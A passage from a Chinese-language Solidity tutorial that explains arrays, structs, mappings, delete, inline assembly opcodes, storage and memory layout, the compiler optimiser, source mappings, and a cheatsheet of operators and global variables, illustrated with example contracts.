to a non-existing index will throw an exception m_pairsOfFlags[index][0] = flagA; m_pairsOfFlags[index][1] = flagB; &#125; function changeFlagArraySize(uint newSize) public &#123; // if the new size is smaller, removed array elements will be cleared m_pairsOfFlags.length = newSize; &#125; function clear() public &#123; // these clear the arrays completely delete m_pairsOfFlags; delete m_aLotOfIntegers; // identical effect here m_pairsOfFlags.length = 0; &#125; bytes m_byteData; function byteArrays(bytes memory data) public &#123; // byte arrays ("bytes") are different as they are stored without padding, // but can be treated identical to "uint8[]" m_byteData = data; m_byteData.length += 7; m_byteData[3] = 0x08; delete m_byteData[2]; &#125; function addFlag(bool[2] memory flag) public returns (uint) &#123; return m_pairsOfFlags.push(flag); &#125; function createMemoryArray(uint size) public pure returns (bytes memory) &#123; // Dynamic memory arrays are created using `new`: uint[2][] memory arrayOfPairs = new uint[2][](size); // Inline arrays are always statically-sized and if you only // use literals, you have to provide at least one type. arrayOfPairs[0] = [uint(1), 2]; // Create a dynamic byte array: bytes memory b = new bytes(200); for (uint i = 0; i &lt; b.length; i++) b[i] = byte(uint8(i)); return b; &#125;&#125; 结构(struct) &emsp;&emsp;Solidity提供了一种声明新的类型的方法，即struct。struct与C/C++一样，用法如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pragma solidity &gt;=0.4.11 &lt;0.6.0;contract CrowdFunding &#123; // Defines a new type with two fields. struct Funder &#123; address addr; uint amount; &#125; struct Campaign &#123; address payable beneficiary; uint fundingGoal; uint numFunders; uint amount; mapping (uint =&gt; Funder) funders; &#125; uint numCampaigns; mapping (uint =&gt; Campaign) campaigns; function newCampaign(address payable beneficiary, uint goal) public returns (uint campaignID) &#123; campaignID = numCampaigns++; // campaignID is return variable // Creates new struct in memory and copies it to storage. // We leave out the mapping type, because it is not valid in memory. // If structs are copied (even from storage to storage), mapping types // are always omitted, because they cannot be enumerated. campaigns[campaignID] = Campaign(beneficiary, goal, 0, 0); &#125; function contribute(uint campaignID) public payable &#123; Campaign storage c = campaigns[campaignID]; // Creates a new temporary memory struct, initialised with the given values // and copies it over to storage. // Note that you can also use Funder(msg.sender, msg.value) to initialise. c.funders[c.numFunders++] = Funder(&#123;addr: msg.sender, amount: msg.value&#125;); c.amount += msg.value; &#125; function checkGoalReached(uint campaignID) public returns (bool reached) &#123; Campaign storage c = campaigns[campaignID]; if (c.amount &lt; c.fundingGoal) return false; uint amount = c.amount; c.amount = 0; c.beneficiary.transfer(amount); return true; &#125;&#125; &emsp;&emsp;该合同不提供众筹合同的全部功能，但它包含理解结构所必需的基本概念。结构可被用于映射(mapping)或者数组(array)类型，并且结构也可以包含映射与数组。 &emsp;&emsp;与C++类似，结构不可包含其自身成员对象，这个限制是必须的，否则无线递归将导致该类型的内存无限大。 注意： 在函数中，把state结构类型变量赋值给一个局部storage类型变量时，并不会复制该对象，而仅仅将一个引用赋值给该局部变量，所以该局部变量可以写入state变量。 &emsp;&emsp;当然，在函数中你可以直接访问一个结构对象的成员，而不必将其再次赋值给一个局部变量，因为Solidity为其创建了getter。 1campaigns[campaignID].amount = 0 映射(Mapping) &emsp;&emsp;映射与python中的字典类似但意义不同，其声明的语法如下： 123mapping(_KeyType =&gt; _ValueType)//_KeyType可以是任意初等型 &emsp;&emsp;这意味着_KeyType可以是任何内置值类型加上bytes和string类型，但是不能被定义为复杂类型(contract types, enums, mappings, structs 以及除了bytes与string之外的所有array类型)._ValueType则可以为任意类型，包括映射。 &emsp;&emsp;你可以将映射理解为哈希表(Hash Table)，Key的值不储存在映射中，我们只用他的keccak256来进行索引。 因此，映射没有要设置的键或值的长度或概念。 &emsp;&emsp;映射类型具有storage的数据储存类型，因此他允许作为状态变量，或者作为storage的引用在函数中存在，或者作为library函数的参数。但是他们不能用于public函数的返回值或者参数。 &emsp;&emsp;你可以将映射标记为public类型，并且Solidity为他创建了一个getter()接口，_KeyType将作为getter()的参数，如果_ValueType是值类型或者结构类型，那么getter将直接返回该对象，如果_ValueType是数组或映射，那么getter将返回一个包含所有_KeyType的变量，这将可以递归下去。 实例如下： 1234567891011121314151617pragma solidity &gt;=0.4.0 &lt;0.6.0;contract MappingExample &#123; mapping(address =&gt; uint) public balances; function update(uint newBalance) public &#123; balances[msg.sender] = newBalance; &#125;&#125;contract MappingUser &#123; function f() public returns (uint) &#123; MappingExample m = new MappingExample(); m.update(100); return m.balances(address(this)); &#125;&#125; 映射类型是不可迭代的，但是你可以用他实现数据结构。 delete &emsp;&emsp;Solidity的delete与其他语言有所不同，这里的delete是将一个对象清零，你甚至可以用他来进行变量声明，delete a是将a初始化为0,若delete作用于动态数组则将其length变为0,若作用于静态数组则将其所有元素清零。delete a[x]则将清除这个单独的元素，并不会改变length和其他元素，但是这意味着数组留下了间隙，如果你打算删除数组中的元素，或许映射是更好的选择。 &emsp;&emsp;若作用于结构，它将重新初始化结构。换言之，删除后a的值与声明a时的值相同，但需注意以下事项： delete对映射无效，因此假如struct中含有映射对象，delete并不会递归执行。但是映射单独的键值关系可以被删除： 1delete a[msg.sender]; //这将是有效的 当对象a是一个引用时，delete将不会修改其原来的值，而是直接重置a对象本身。 &emsp;&emsp;用法如下： 123456789101112131415161718pragma solidity &gt;=0.4.0 &lt;0.6.0;contract DeleteExample &#123; uint data; uint[] dataArray; function f() public &#123; uint x = data; delete x; // sets x to 0, does not affect data delete data; // sets data to 0, does not affect x uint[] storage y = dataArray; delete dataArray; // this sets dataArray.length to zero, but as uint[] is a complex object, also // y is affected which is an alias to the storage object // On the other hand: "delete y" is not valid, as assignments to local variables // referencing storage objects can only be made from existing storage objects. assert(y.length == 0); &#125;&#125; 3. 汇编基础(Solidity Addembly) 指令集 &emsp;&emsp;首先，我们来给出Solidity的指令集，这些东西有利于理解opcodes(操作码) &emsp;&emsp;如果opcode带有参数(从栈顶获取)，那么参数将在括号内给出。注意，在非函数样式中，参数的顺序反了过来，这很容易理解，他与C语言传参方式相同。opcode如果带有 - 标记，那么他将不会往栈上push一个对象(即无返回值)，如果带有*标记，代表他们比较特殊，其他没有标记的instruction将会向栈上push一个对象，这将是他们的返回值。若opcode被F，H，B或者C标记，那么他们分别是出现自 Frontier, Homestead, Byzantium or Constantinople. Constantinople 仍然在计划中，所有被标记C的指令将导致无效或异常。 &emsp;&emsp;在以下指令中mem[)表示从a开始但不包括b的memory字节，storage[p]表示包含在p位置的storage内容。 pushi与jumpdest不能被直接使用。 &emsp;&emsp;在语法中，操作码被表示为预先定义的标识符。 指令(Instruction) 解释(解释) stop - F 停止执行，等价于return(0,0) add(x, y) F x + y sub(x, y) F x - y mul(x, y) F x * y div(x, y) F x / y sdiv(x, y) F x / y, 二进制补码表示的有符号数 mod(x, y) F x % y smod(x, y) F x % y, 二进制补码表示的有符号数 exp(x, y) F x的y次幂 not(x) F ~x, x的每位取非 lt(x, y) F 若 x &lt; y 则为1, 否则为0 gt(x, y) F 若 x &gt; y 则为1, 否则为0 slt(x, y) F 若 x &lt; y 则为1, 否则为0, 二进制补码表示的有符号数 sgt(x, y) F 若 x &gt; y 则为1, 否则为0, 二进制补码表示的有符号数 eq(x, y) F 若 x == y 则为1, 否则为0 iszero(x) F 若 x == 0 则为1, 否则为0 and(x, y) F 按位将x y进行and运算 or(x, y) F 按位将x y进行or运算 xor(x, y) F 按位将x y进行xor运算 byte(x, x) F x的第n个字节，其中最重要的字节是第0个字节 shl(x, y) C 将y逻辑左偏移x位 sar(x, y) C 将y逻辑右偏移x位 addmod(x, y, m) F (x + y) % m 具有任意精度的运算 mulmod(x, y, m) F (x * y) % m 具有任意精度的运算 keccak256(p, n) F keccak(mem[p…(p+n))) jump(label) - F jump到 label / code 的位置 jumpi(lable, cond) - F jump到 label 若 cond 非零 pc F 当前代码位置 pop(x) - F stack弹出一个元素 dup 1 … dup 16 * F 将第n个stack的slot复制到栈顶(从顶算起) swap 1 … swap 16 * F 交换顶与栈底的第n个slot mload(p) F mem[p…(p+32)) mstore(p, v) - F mem[p…(p+32)) := v mstore8(p, v) - F mem[p] := v &amp; 0xff 只修改一个字节 sload(p) F storage[p] sstore(p, v) - F storage[p] := v msize F memory的大小，即最大可访问的内存索引 gas F 仍可用于执行的gas的量 address F 当前合约或正在执行的上下文的地址 balance(a) F 地址a的账户存款,以wei表示 caller F call的sender(不包括delegatecall) callvalue F 当前发送call所发送eth的总量,以wei表示 calldatasize F 以字节表示的当前call data的大小 calldatacopy(t, f, s) - F 从calldata的f位置复制s个字节到memory的t位置 extcodesize F 当前合约或上下文的代码的大小 extcodecopy(a, t, f, s) - F 与codecopy(t, f, s)类似,但是是从地址a处复制 returndatasize B 上次返回值的大小 returndatacopy(t, f, s) - B 将f位置的返回值复制s字节到memory的t位置 extcodehash(a) C 地址a的hash create(v, p , n) F 以mem[p…(p+n))处的代码创建一个新的合约并且发送v数量的wei,返回新地址 call(g, a, v, in, insize,out, outsize) F 将mem[in…(in+insize))作为输入调用a地址的合约,提供g数量的gas,若出错则返回0(gas耗尽),成功返回1 callcode(g, a, v, in, insize, out, outsize) F 与call相同,但是保留当前上下文 delegatecall(g, a, in, insize, out, outsize) B 与callcode相同,但是保持当前的caller与callvalue staticcall(g, a, in, insize, out, outsize) B 与call(g, a, 0, in, insize, out, outsize)相同,但是不允许状态改变 return(p, s) - F 结束执行,返回mem[p…(p+s))处的数据 revert(p, s) - B 结束执行,回滚状态的改变,返回mem[p…(p+s))处的数据 selfdestruct(a) - F 结束执行,销毁当前合约,并将全部余额打入地址a invalid - F 以无效指令结束执行 origin F 交易发送者 gasprice F 交易的gas价格 blockhash(b) F 块nr b的哈希-仅限于最近256个块,不包括当前块 coinbash F 当前挖矿的收益 timestamp F 以秒为单位的当前区块的时间戳,从创世纪开始算起 number F 当前的区块数 difficulty F 当前区块的困难度 gaslimit F 当前区块的gas限制 字面量(Literals) &emsp;&emsp;你可以直接使用十进制或者十六进制的符号作为整数常量，并且pushi指令将会自动执行，如下代码2+3的到5然后和string “abc”进行and运算。最终结果被赋值给局部变量x。string是左对齐的并且不能超过32字节。 1assembly &#123; let x := and("abc", add(3, 2)) &#125; 函数风格(Functional Style) &emsp;&emsp;对于opcode序列,通常很难看到某些opcode的实际参数是什么。如下例子中，3被加到当前memory的0x80的的位置。 13 0x80 mload add 0x80 mstore Solidity的内联汇编有函数风格的表示，如下： 1mstore(0x80, add(mload(0x80), 3)) &emsp;&emsp;如果从右到左读取代码，最终得到的常量和opcode序列完全相同，但值的结束位置要清楚得多。 &emsp;&emsp;如果您关心确切的栈布局，只需注意函数或opcode的语法第一个参数将放在栈的顶部。 访问外部调用变量，函数和库 &emsp;&emsp;你可以使用Solidity变量和其他标识符的名称来访问它们。对于存储在memory位置中的变量，他们的地址而不是值将会被推送到栈上。存储在storage位置中的变量是不同的，因为它们可能不会占用完整的存储槽，所以它们的”地址”由slot和slot内的字节偏移量组成。要检索变量x指向的插槽，可以使用x_slot，并使用x_offset字节偏移量索引。 &emsp;&emsp;例如： 12345678910pragma solidity &gt;=0.4.11 &lt;0.6.0;contract C &#123; uint b; function f(uint x) public view returns (uint r) &#123; assembly &#123; r := mul(x, sload(b_slot)) // ignore the offset, we know it is zero &#125; &#125;&#125; &emsp;&emsp;如果访问的变量的类型跨度小于256位(例如uint64、address、bytes16或byte)，则不能对不属于类型编码的位进行任何假设。尤其是，不要假设它们为零。为了安全起见，在重要的上下文中使用数据之前，请务必正确地清除数据：uint32 x=f();assembly x：=and(x,0xffffffff) /*现在使用x*/ 清除签名类型，可以使用signextend的opcode。 对Label的支持从0.5.0后被移除，只能使用function或者loop，而不能使用万恶的goto。 &emsp;&emsp;你可以使用let关键字声明一个之在汇编内可见的局部变量，并且之在当前的代码块内可见。let指令将会新建一个栈的slot来存储变量并且代码块结束时自动移除。你需要为他提供一个初始化值，否则他默认为0。当然你可以按照更复杂的函数式来实现。 123456789101112131415pragma solidity &gt;=0.4.16 &lt;0.6.0;contract C &#123; function f(uint x) public view returns (uint b) &#123; assembly &#123; let v := add(x, 1) mstore(0x80, v) &#123; let y := add(sload(v), 1) b := y &#125; // y is "deallocated" here b := add(b, v) &#125; // v is "deallocated" here &#125;&#125; 将汇编的局部变量复制给函数的局部变量是可行的，需要注意的是，在将storage或memory类型的指针复制给变量时要格外小心，你只会修改指针而不会修改变量。变量只能被赋予一个确切值，假如你要获得一个多返回值函数的返回值，那么你需要提供多个变量。 123456&#123; let v := 0 let g := add(v, 2) function f() -&gt; a, b &#123; &#125; let c, d := f()&#125; &emsp;&emsp;if语句条件执行，但是没有”else”的部分。如果你想提供多重选择，你可以考虑使用switch语句。 123&#123; if eq(value, 0) &#123; revert(0, 0) &#125;&#125; 程序体需要大括号 &emsp;&emsp;你可以使用switch语句来实现基本的”if/else”语句，你可以使用 default 关键字来声明一个fallback或者默认选项。 1234567891011&#123; let x := 0 switch calldataload(4) case 0 &#123; x := calldataload(0x24) &#125; default &#123; x := calldataload(0x44) &#125; sstore(0, div(x, 2))&#125; switch块不需要大括号，但是每个case需要大括号。 &emsp;&emsp;汇编支持for风格的循环，他包含一个初始化部分，一个条件判断部分和一个迭代部分。条件判断部分必须使用函数风格，而另外两个部分则使用代码块，若初始化部分声明了某些变量，那么他们的作用与将延伸值循环体内(包括条件判断与迭代部分)。 &emsp;&emsp;以下例子是计算一片内存的和： 123456&#123; let x := 0 for &#123; let i := 0 &#125; lt(i, 0x100) &#123; i := add(i, 0x20) &#125; &#123; x := add(x, mload(i)) &#125;&#125; &emsp;&emsp;当然，你也可以用他来实现while风格： 12345678&#123; let x := 0 let i := 0 for &#123; &#125; lt(i, 0x100) &#123; &#125; &#123; // while(i &lt; 0x100) x := add(x, mload(i)) i := add(i, 0x20) &#125;&#125; &emsp;&emsp;汇编也支持低级函数的定义，参数和返回地址来自栈，返回值也将布置到栈上，调用一个函数看起来像执行一段函数类型opcode。函数可以被定义在任意位置，其可视范围是所定义的代码块，在函数体内你不能访问外部的变量，而且函数没有显示的return语句。 如果你的函数有多个返回值，那么你需要将他们复制给一个元组(即多个变量) &emsp;&emsp;下面的示例通过平方和乘法实现幂函数： 123456789101112&#123; function power(base, exponent) -&gt; result &#123; switch exponent case 0 &#123; result := 1 &#125; case 1 &#123; result := base &#125; default &#123; result := power(mul(base, base), div(exponent, 2)) switch mod(exponent, 2) case 1 &#123; result := mul(base, result) &#125; &#125; &#125;&#125; Solidity 中的转换(Conventions in Solidity) &emsp;&emsp;与EVM汇编相比，Solidity有些类型不足256位，为了使计算更有效，EVM通常将他们以256为来对待，强行把它们放在一个slot内，而高阶位元只在必要时才会被清理，就在它们被写入内存或执行比较之前不久。所以如果你想要使用内联汇编来访问他们的话，你必须手动清零高位。&emsp;&emsp;solidity以一种非常简单的方式管理内存：内存中的位置0x40处有一个“空闲内存指针”。如果要分配内存，只需使用从指针指向的位置开始的内存，并相应地更新它。但我们无法保证内存之前没有被使用过，所以你不能假设他的初始内容是0。没有内置的内存释放或回收机制，下面是一个内存分配的例子： 1234function allocate(length) -&gt; pos &#123; pos := mload(0x40) mstore(0x40, add(pos, length))&#125; &emsp;&emsp;前64个字节的内存可以用作短期分配的“临时空间”。储存空闲内存指针后的32个字节(即从0x60开始)应永久为零，并用作空动态内存数组的初始值。这意味着可分配内存从0x80开始，这是可用内存指针的初始值。 &emsp;&emsp;solidity中memory数组中的元素总是占用32字节的倍数(是的，对于byte[]甚至是这样，但对于bytes和string则不是这样)。多维memory数组是指向memory数组的指针。动态数组的长度存储在数组的第一个solt(第一个32byte)中，然后是数组元素。 静态大小的memory数组没有长度字段，但日后可能会添加该字段，以便在静态大小的数组和动态大小的数组之间实现更好的可转换性，因此请不要依赖于此。 独立汇编(Standalone Assembly) &esmp;&emsp;独立汇编是区块链逆向的基础，我们直接来感受一下吧： 123456789pragma solidity &gt;=0.4.16 &lt;0.6.0;contract C &#123; function f(uint x) public pure returns (uint y) &#123; y = 1; for (uint i = 0; i &lt; x; i++) y = 2 * y; &#125;&#125; &emsp;&emsp;对应汇编如下： 12345678910111213141516171819202122232425&#123; mstore(0x40, 0x80) // 储存 &quot;空闲memory指针” // 函数调度器，注意这里的运行方式 switch div(calldataload(0), exp(2, 226)) case 0xb3de648b &#123; let r := f(calldataload(4)) let ret := $allocate(0x20) mstore(ret, r) return(ret, 0x20) &#125; default &#123; revert(0, 0) &#125; // 内存分配器 function $allocate(size) -&gt; pos &#123; pos := mload(0x40) mstore(0x40, add(pos, size)) &#125; // 合约函数部分 function f(x) -&gt; y &#123; y := 1 for &#123; let i := 0 &#125; lt(i, x) &#123; i := add(i, 1) &#125; &#123; y := mul(2, y) &#125; &#125;&#125; 注意 函数的调度是通过一个16位字节码来实现的，即上例的switch/case部分，switch的操作就是将调用地址转化成一个16位字节码，若调用地址与某函数字节码对应，则调至该函数，这一步分在区块链逆向中十分常见。 &emsp;&emsp;关于汇编的语法我不想多将，其更重要的是EVM的运行机制，我们会在后面进行说明。 4. 杂项(Miscellaneous) 状态变量的内存布局 &emsp;&emsp;固定大小的变量(除了mapping和动态数组)都存储在从0开始的连续区域内，多个少于32字节的连续对象将按照一下规则被打包在一个slot内： slot中的第一个对象是低阶对齐的 基本类型只消耗存储他们所必须的字节 若slot中剩下的空间不足储存一个基本类型，那么他将被存储到下一个slot 结构和数组总是占据一个新的slot并占据整个slot，但是其中的数据将符合这些规则 &emsp;&emsp;当使用的变量小于32字节时，你的合约将消耗更多的gas。因为EVM一次对32字节进行操作，因此如果变量小于32字节，EVM必须执行更多的指令，将元素从32字节减小到所需大小。&emsp;&emsp;只有当处理storage类型的变量是减小参数的大小才是有益的，因为编译器将把多个元素打包到一个slot内，从而将多次读写结合在一个操作内。当处理函数参数或者memory类型的变量时，这并没有什么增益，因为编译器并不会将他们打包。&emsp;&emsp;为了确保EVM能够对此优化，你应当保证storage类型的变量能够被紧密的打包，例如，声明storage变量uint128, uint128, uint256将会比uint128, uint 256, uint128更加有效，因为前者占用两个slot而后者占用三个。 struct和mapping中的元素将彼此紧挨着存在一起，就好像他们已经被显示的给定。 映射与动态数组(Mappings and Dynamic Arrays) &emsp;&emsp;由于映射与动态数组大小的不可预测性，通常情况下使用keccak-256的hash来计算值的起始位置或者查找数组的值，这些起始位置总是占据一个slot。 &emsp;&emsp;根据以上规则，映射与动态数组本身将在storage的p处占据一个slot。对于动态数组来说，这个slot(即数组指针的位置)将用来储存该数组的大小。对于映射来说，这个slot将是空的(但这是必要的，以便两个相等的映射具有不同的hash分布)。数组的数据将被出存在keccak256(p)处，而映射键k所对应的值p将出存在keccak256(k.p)处，若所对应的值仍为非基本类型，则其储存位置为keccak256(k.p)加一个偏移。 &emsp;&emsp;例如以下合约片段： 1234567pragma solidity &gt;=0.4.0 &lt;0.7.0;contract C &#123; struct s &#123; uint a; uint b; &#125; uint x; mapping(uint =&gt; mapping(uint =&gt; s)) data;&#125; data[4][9].b的位置在 keccak256(uint256(9).keccak256(uint256(4).uint256(1))) + 1 二进制数组与字符串(Bytes and String) &emsp;&emsp;bytes和string将会被完全相同地编码。对于 short byte arrays 长度和数据将会被出存在同一个slot内。特别地：如果数据最长为 31 bytes， 那么数据将会存储在高阶字节中(左对齐)，最低阶字节存储 length * 2 。对于存储32或更长字节的数组，主slot将存储 length * 2 +1,数据通常存储在 keccak256(slot) 中。这意味着你可以通过检查是否设置了低位来区分长数组与短数组：短数组(未设置) 长数组(设置) 处理非法编码的插槽目前并不支持，但日后可能会增加。 内存布局(Layout in Memory) &emsp;&emsp;solidity保留4个32-bytes的slot，具体范围与使用目的如下： 0x00 - 0x3f(64字节)：哈希运算的草稿(scratch)空间，即临时空间 0x40 - 0x5f(32字节)：当前分配的内存大小(空闲内存指针) 0x60 - 0x7f(32字节)：零插槽(Zero slot) &emsp;&emsp;可以在语句之间使用Strach空间(即内联汇编)。零插槽用于给动态数组初始化，永远都不应被写入，因此空闲内存指针z最初指向 0x80。 &emsp;&emsp;Solidity总是将新的对象放置于空闲内存指针上，并且内存将永远不会释放(这在以后可能会改变)。 Solidity中可能有一些操作会使用超出64字节的临时空间(Scratch)，他们将会被分配到空闲内存指针指向的位置，但是给予其较短的生命周期，而且指针本身不会更新，因此该内存可能为零也可能不为零。所以，我们不应当认为空闲内存是默认置零的。看起来使用 msize 来获得一个确定的置零空闲内存是个不错的选择，然而，如果不更新此指针，将其作为非临时指针使用的话可能带来负面效果，原理同上。 注：msize的作用为获得当前最大可索引空间的大小，即空闲指针。 调用数据布局(Layout of Call Data) &emsp;&emsp;函数调用时的数据将被假定为ABI规范定义的格式。其中，ABI规范要求将参数填充为32字节的倍数。Internal类型的函数调用使用不同的约定。 &emsp;&emsp;合约构造函数的参数将会直接附加在合约代码的末尾，也使用ABI编码。构造函数将使用硬编码偏移量来访问他们，而非使用 codesize 的操作码，因为当数据附加到代码时，其将会发生改变。 内部–清理变量(Internals-Cleaning Up Variables) &emsp;&emsp;当一个值小于256位时，在某些情况下必须清空剩余的位。Solidity编译器将会在这些多余的垃圾位产生不利影响之前将其清空。例如，再将数据写入内存之前，剩余位需要被清空，因为这些位可能会造成数据紊乱。 &emsp;&emsp;另一方面，如果后续操作不受影响，我们将不会立即清理位。例如，由于 Jumpi 指令认为任何非零值都为真，因此在讲布尔值用作Jumpi条件之前我们不会清空这些值。 &emsp;&emsp;除了以上设计原则之外，Solidity编译器将在数据加载到堆栈上时清空输入数据。不同数据的类型具有不同的清空规则： 类型(Type) 有效值 无效值导致的结果 n个成员的枚举 0到n-1 异常 布尔 0或1 1 有符号整数 符号扩展字 目前会直接打包；将来会抛出异常 无符号整数 高位补0 目前会直接打包；将来会抛出异常 内部优化(Internals-The Optimiser) &emsp;&emsp;Solidity 优化器是在汇编语言级别工作的，所以它可以并且也被其他语言所使用。它通过 JUMP 和 JUMPDEST 语句将指令集序列分割为基础的代码块。在这些代码块内的指令集会被分析，并且对堆栈、内存或存储的每个修改都会被记录为表达式，这些表达式由一个指令和基本上是指向其他表达式的参数列表所组成。这个优化器使用一个叫做“CommonSubexpressionEliminator”的组件lai，在其他任务中，找到恒等的表达式，并将它们组合到一个表达式类中，优化器将将首先尝试在已知表达式中查询新的表达式。如果没有找到，表达式将会按照 constant + constant = sum_of_constants 或者 x * 1 = x 的规则进行简化。由于这是一个递归的执行过程，因此，如果我们知道一个复杂的表达式恒等于1时，我们可以应用第二条规则。对于storage和memory具体位置的修改必须删除有关storage与memory位置的认知(Knowledge)，这里的区别我们并不清楚：假如我们先在x位置写入，然后在y位置写入，并且两者都是输入变量，那么第二个变量将会覆盖第一个，因此在y写入后我们并不知道x中储存了什么。如果表达式 x-y 的简化结果为非零常量，那么我们知道我们可以保持对x中存储内容的认知。 &emsp;&emsp;在这个过程之后，我们知道哪些表达式必须在栈的末尾，并有一个对内存和存储的修改列表。这些信息与基本块一起存储，并用于链接它们。此外，有关堆栈、存储和内存配置的知识将转发到下一个块。如果我们知道所有 JUMP 和 JUMPI的目标，我们就可以建立一个完整的程序控制流程图。如果只有一个我们不知道的目标(原则上这可以发生，跳跃目标可以从输入中计算)，我们必须清除有关块输入状态的所有认知，因为它可能是未知跳跃的目标。如果优化器找到一个条件值为常量的 Jumpi，它会将其转换为无条件的 Jumpi。 &emsp;&emsp;最后一步是重新生成每个块中的代码。优化器从块末尾堆栈上的表达式创建依赖关系图，并删除不属于此图的每个操作。它生成的代码按照原始代码的顺序将修改应用于内存和存储(删除发现不需要的修改)。最后，它生成所有需要在堆栈上正确位置的值。 &emsp;&emsp;这些步骤应用于每个基本块，如果新生成的代码较小，则将其用作替换代码。如果在 Jumpi 处拆分基本块，并且在分析过程中，条件评估为常量，则根据常量的值替换 Jumpi。例如： 123456uint x = 7;data[7] = 9;if (data[x] != x + 2) return 2;else return 1; 简化后：12data[7] = 9;return 1; 源码映射(Source Mappings) &emsp;&emsp;作为AST输出的一部分，编译器提供由AST中的各个节点表示的源代码范围。这可以用于各种用途，从基于AST报告错误的静态分析工具，到突出显示局部变量及其用途的调试工具。 &emsp;&emsp;此外，编译器还可以生成从字节码到生成指令的源代码范围的映射。这对于在字节码级别上操作的静态分析工具以及在调试器内显示源代码中的当前位置或处理断点来说十分重要。 &emsp;&emsp;这两种源映射都使用整数标识符来引用源文件。源文件的标识符存储在输出[‘sources’][sourcename][‘id’]中，其中output是解析为JSON的标准JSON编译器接口的输出。 对于不与任何特定源文件关联的指令，源映射将分配一个-1的整数标识符。对于源自编译器生成的内联汇编语句的字节码部分，可能会发生这种情况。 AST内的源映射使用以下表示法： 1s:l:f &emsp;&emsp;其中s是到源文件中范围开头的字节偏移量，l是源范围的长度（以字节为单位），f是上面提到的源索引。 &emsp;&emsp;字节码的源映射中的编码更加复杂：它是由 ; 分隔的 s:l:f:j 列表。这些元素中的每一个都对应于一条指令，即不能使用字节偏移量，但必须使用指令偏移量（推送指令比单个字节长）。字段 s ,l 和f如上所述，j可以是 i ,o 或 - 表示跳转指令是进入函数、从函数返回还是作为循环的一部分的常规跳转。 为了压缩这些源映射，尤其是字节码映射，使用以下规则： 如果字段为空，则使用前面元素的值。 如果缺少a:，则以下所有字段都视为空。 这意味着以下源映射表示相同的信息： 1231:2:1;1:9:1;2:1:2;2:1:2;2:1:21:2:1;:9;2:1:2;; 技巧与窍门(Tips and Tricks) 对数组使用 delete 来清空其所有元素 对struct中的元素使用较短的数据类型，并且对他们排序，以便将较短的类型打包在一个slot中来消耗更少的gas 确保state变量为public类型，编译器将为你自动生成一个getter 如果你最终需要在函数开始位置检查很多输入条件或者状态变量的值，你可以尝试使用装饰器(Modifier) 如果你的合约有一个 send 函数，但你想要使用内置的 send 函数，你可以使用 address(contractVariable).send(amount) 使用一个赋值语句就可以初始化 struct：x = MyStruct({a: 1, b: 2}); 如果存储结构具有紧密打包(Tightly packed)的属性，请使用单独的赋值对其进行初始化：x.a=1;x.b=2;。这样，优化器一次更新存储将更容易，从而使分配开销更小。 速查表(Cheatsheet) &emsp;&emsp;运算符顺序优先级排序，以下是按计算顺序列出的运算符的优先顺序。 优先 描述 算符 1 后置自增和自减 ++，-- 1 创建类型实例 new &lt;typename&gt; 1 数组元素 &lt;array&gt;[&lt;index&gt;] 1 访问成员 &lt;object&gt;.&lt;member&gt; 1 函数调用 &lt;func&gt;(&lt;args...&gt;) 1 小括号 (&lt;statement&gt;) 2 前置自增和自减 ++, -- 2 一元运算的加和减 +,- 2 一元操作符 delete 2 逻辑非 ! 2 按位非 ~ 3 乘方 ** 4 乘、除和模运算 *, /, % 5 算术加和减 +, - 6 移位操作符 &lt;&lt;, &gt;&gt; 7 按位与 &amp; 8 按位异或 ^ 9 按位或 ` ` 10 非等操作符 &lt;, &gt;, &lt;=, &gt;= 11 等于操作符 ==, != 12 逻辑与 &amp;&amp; 13 逻辑或 ` ` 14 三元操作符 &lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt; 15 赋值操作符 `=, =, ^=,&amp;=, &lt;&lt;=, &gt;&gt;=, +=, -=, *=, /=, %=` 16 逗号 , 全局变量(Global Variables) abi.encode(...) returns (bytes)： ABI - 对给定参数进行编码 abi.encodePacked(...) returns (bytes)：对给定参数执行 紧打包编码 abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)： ABI - 对给定参数进行编码，并以给定的函数选择器作为起始的 4 字节数据一起返回 abi.encodeWithSignature(string signature, ...) returns (bytes)：等价于 abi.encodeWithSelector(bytes4(keccak256(signature), ...) block.blockhash(uint blockNumber) returns (bytes32)：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 blockhash(uint blockNumber)代替 block.coinbase （address）：挖出当前区块的矿工的地址 lock.difficulty （uint）：当前区块的难度值 block.gaslimit （uint）：当前区块的 gas 上限 block.number （uint）：当前区块的区块号 block.timestamp （uint）：当前区块的时间戳 gasleft() returns (uint256)：剩余的 gas msg.data （bytes）：完整的 calldata msg.gas （uint）：剩余的 gas - 自 0.4.21 版本开始已经不推荐使用，由 gesleft() 代替 msg.sender （address）：消息发送方（当前调用） msg.value （uint）：随消息发送的 wei 的数量 now （uint）：当前区块的时间戳（等价于 block.timestamp） tx.gasprice (uint)：交易的 gas price tx.origin （address）：交易发送方（完整调用链上的原始发送方） assert(bool condition)：如果条件值为 false 则中止执行并回退所有状态变更（用做内部错误） require(bool condition)：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误） require(bool condition, string message)：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误），可以同时提供错误消息 revert()：中止执行并回复所有状态变更 revert(string message)：中止执行并回复所有状态变更，可以同时提供错误消息 blockhash(uint blockNumber) returns (bytes32)：指定区块的区块哈希——仅可用于最新的 256 个区块 keccak256(...) returns (bytes32)：计算 紧打包编码 的 Ethereum-SHA-3（Keccak-256）哈希 sha3(...) returns (bytes32)：等价于 keccak256 sha256(...) returns (bytes32)：计算 紧打包编码 的 SHA-256 哈希 ripemd160(...) returns (bytes20)：计算 紧打包编码 的 RIPEMD-160 哈希 ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)：基于椭圆曲线签名找回与指定公钥关联的地址，发生错误的时候返回 0 addmod(uint x, uint y, uint k) returns (uint)：计算 (x + y) % k 的值，其中加法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 assert(k != 0);作为参数检查，译者注）。 mulmod(uint x, uint y, uint k) returns (uint)：计算 (x * y) % k 的值，其中乘法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 assert(k != 0);作为参数检查，译者注）。 this（类型为当前合约的变量）：当前合约实例，可以准确地转换为 address super：当前合约的上一级继承关系的合约 selfdestruct(address recipient)：销毁当前合约，把余额发送到给定地址 